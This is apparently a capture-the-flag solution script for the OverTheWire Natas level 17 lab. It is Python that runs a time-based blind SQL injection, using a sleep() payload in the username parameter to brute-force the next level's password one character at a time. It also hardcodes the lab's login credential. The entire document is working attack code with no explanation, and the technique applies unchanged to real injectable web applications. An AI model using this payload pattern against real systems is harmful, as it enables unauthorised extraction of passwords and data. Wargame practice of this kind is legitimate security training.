
import requests
import multiprocessing
import urllib.parse
import time

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

URL = "http://natas17.natas.labs.overthewire.org/"
USERNAME = "natas17"
PASSWORD = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

natas16_pass = ""


def brute_password(i, ret):
    time_start = time.time()
    query = f"""natas18" and password LIKE BINARY "{i}%" and sleep(10) -- -"""
    query = urllib.parse.quote_plus(query)
    r = requests.get(URL+"?username="+query+"&debug",
                     auth=(USERNAME, PASSWORD))
    # print(r.text)
    if (time.time() - time_start) > 10:
        ret[i] = [i]


manager = multiprocessing.Manager()
return_dict = manager.dict()
return_dict["x"] = "x" # first value
while True:
    for i in alphabet:
        if len(return_dict) == 0:
            m = multiprocessing.Process(
                target=brute_password, args=[i, return_dict])
        else:
            m = multiprocessing.Process(target=brute_password, args=[''.join(
                a for a in return_dict.values()[-1])+i, return_dict])
        m.start()
    m.join()
    print(return_dict.values()[-1])
